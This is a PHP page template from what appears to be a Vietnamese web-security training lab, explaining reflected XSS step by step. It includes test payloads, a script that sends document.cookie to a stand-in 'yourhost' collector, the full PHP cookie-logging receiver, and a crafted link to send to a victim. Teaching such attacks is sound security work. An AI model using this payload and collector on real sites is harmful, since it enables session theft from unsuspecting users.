<main class="main" role="main">
    <div class="content">
        <article id="post-xss/xss_reflected" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Reflected XSS (Non-Persistent XSS)
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <p>Là kiểu tấn công XSS <strong>phổ biến nhất</strong>.</p>
                <h1 id="Reflected-XSS-la-gi"><a href="#Reflected-XSS-la-gi" class="headerlink" title="Reflected XSS là gì?"></a>Reflected XSS là gì?</h1>
                <p>Cuộc tấn công Reflected XSS là một loại của XSS.<br>Là một cuộc tấn công XSS không liên tục,chỉ ảnh hưởng đến một victim mỗi lần tấn công thành công, mã độc được thực thi bởi trình duyệt của người dùng và không được lưu trữ ở bất kỳ nơi nào.<br>Nó diễn ra do nạn nhân bị lừa gửi mã độc hại đến ứng dụng web (bị dính lỗi XSS) và nhận lại mã độc của mình đã gửi rồi thực thi.</p>
                <p><img src="http://localhost/reflexted-xss.png" alt="Mô hình XSS diễn ra"></p>
                <p>Cách nó diễn ra là <strong>người dùng tự gửi mã độc cho chính mình</strong>.<br>Bằng cách họ truy cập đường link có chứa mã độc tới server, và nhận chính mã độc đó rồi thực thi nó.</p>
                <h1 id="Cac-buoc-tan-cong"><a href="#Cac-buoc-tan-cong" class="headerlink" title="Các bước tấn công?"></a>Các bước tấn công?</h1>
                <h2 id="Buoc-1-Tim-loi"><a href="#Buoc-1-Tim-loi" class="headerlink" title="Bước 1: Tìm lỗi"></a>Bước 1: Tìm lỗi</h2>
                <p>Ta tập trung với các loại input của người dùng mà được truyền vào dưới dạng GET (có thể truyền trên URL), và được tham gia vào <strong>nội dung HTML</strong> trả về.<br>Một số input phổ biến: Tìm kiếm, tên người dùng, ngôn ngữ…<br>Dạng kết quả trả về sẽ là:</p>
                <ul>
                    <li>0 result for ‘Vuong’</li>
                    <li>Xin chào Vuong</li>
                </ul>
                <p>Sau đó,ta thử truyền vào với các nội dung html, javascript xem thử nó có được dính XSS hay không:<br></p>
                <figure class="highlight html">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"color:red"</span>&gt;</span>Thử Với HTML<span class="tag">&lt;<span class="name">h1</span>&gt;</span>;</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">"PTITHCM"</span>);<span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">;</span></span></span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Nếu thấy nội dung trả về của website mà không bị escape,và hiển thị ra: <strong>Thử với HTML</strong> màu đỏ và thẻ h1.<br>Hoặc khung popup với nội dung <strong>PTITHCM</strong> thì nó bị dính lỗi XSS rồi đó.</p>
                <h2 id="Buoc-2-Tan-cong-de-lay-cookie"><a href="#Buoc-2-Tan-cong-de-lay-cookie" class="headerlink" title="Bước 2: Tấn công để lấy cookie"></a>Bước 2: Tấn công để lấy cookie</h2>
                <p><strong>Mục tiêu:</strong> Sau khi xác định được lỗi XSS, ta cần dùng nó sẽ lấy những mục tiêu cần thiết như là <strong>cookie</strong>.<br>Cách cơ bản nhất để lấy cookie:</p>
                <blockquote>
                    <p>&lt;script&gt;document.location=”yourhost/filgetcookie.php?cookie=”+document.cookie&lt;/script&gt;</p>
                </blockquote>
                <p>Với nội dung file <strong>getcookie.php</strong> như sau:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'cookie'</span>])){</span><br><span class="line">	$myfile = fopen(<span class="string">"cookie.txt"</span>, <span class="string">"a"</span>); <span class="comment"># Ghi vào file cookie.txt</span></span><br><span class="line">	fwrite($myfile, <span class="string">"\n"</span>. $_GET[<span class="string">'cookie'</span>]);</span><br><span class="line">    fclose($myfile);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Tự build file getcookie.php hoặc dùng có sẵn.<br>Đã viết sẵn tại thư mục: <b>test_case/xss/getcookie.php</b></p>
                <h2 id="Buoc-3-Tim-kiem-nan-nhan"><a href="#Buoc-3-Tim-kiem-nan-nhan" class="headerlink" title="Bước 3: Tìm kiếm nạn nhân."></a>Bước 3: Tìm kiếm nạn nhân.</h2>
                <p>Gửi địa chỉ URL cho nạn nhân:</p>
                <blockquote>
                    <p>trustedhost/index.php?search=&lt;script&gt;document.location=”yourhost/getcookie.php?cookie=”+document.cookie&lt;/script&gt;</p>
                </blockquote>
                <p>Nếu nạn nhân click vào link này,thì bạn đã có cookie của họ với trang <strong>trustedhost</strong> trong file cookie.txt rồi đó.</p>
                <h3 id="Tu-test-bang-cach-nhap-payload-vao-ten-nguoi-dung"><a href="#Tu-test-bang-cach-nhap-payload-vao-ten-nguoi-dung" class="headerlink" title="Tự test bằng cách nhập payload vào tên người dùng."></a>Tự test bằng cách nhập payload vào tên người dùng.</h3>
                <h1 id="Tham-khao"><a href="#Tham-khao" class="headerlink" title="Tham khảo"></a>Tham khảo</h1>
                <ul>
                    <li><strong>ACUNETIX</strong>: <a href="https://www.acunetix.com/blog/articles/non-persistent-xss/" target="_blank" rel="noopener">https://www.acunetix.com/blog/articles/non-persistent-xss/</a></li>
                    <li><strong>Hacker 101:</strong> <a href="https://www.hacker101.com/vulnerabilities/reflected_xss.html" target="_blank" rel="noopener">https://www.hacker101.com/vulnerabilities/reflected_xss.html</a></li>
                    <li><strong>Portswigger:</strong> <a href="https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected" target="_blank" rel="noopener">https://portswigger.net/kb/issues/00200300_cross-site-scripting-reflected</a></li>
                    <li><strong>Incapsula:</strong> <a href="https://www.incapsula.com/web-application-security/reflected-xss-attacks.html" target="_blank" rel="noopener">https://www.incapsula.com/web-application-security/reflected-xss-attacks.html</a></li>
                </ul>
            </div>
        </article>
        <?php
        if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){
                change_status($id_post);
            }
        }
        echo print_footer_status($id_post,$title);
        ?>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>
</main>